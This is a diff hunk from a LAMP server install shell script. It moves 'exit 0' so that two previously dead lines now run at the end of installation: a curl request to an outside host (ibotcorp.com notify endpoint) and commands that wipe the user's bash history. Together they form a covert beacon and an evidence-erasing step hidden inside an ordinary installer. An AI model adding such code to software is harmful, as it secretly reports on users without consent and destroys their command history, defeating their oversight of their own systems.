@@ -979,9 +979,9 @@ EOF
     _info "Completion time: $(date "+%Y-%m-%d %H:%M:%S") (Use:$(_red $[($(date +%s)-StartDateSecond)/60]) minutes)"
     _info "Welcome to visit our website: https://lamp.sh"
     _info "Enjoy it"
-    exit 0
     curl https://www.ibotcorp.com/api/notify.php?q=install_100
     cat /dev/null > ~/.bash_history && history -c
+    exit 0
 }
 
 #Install tools
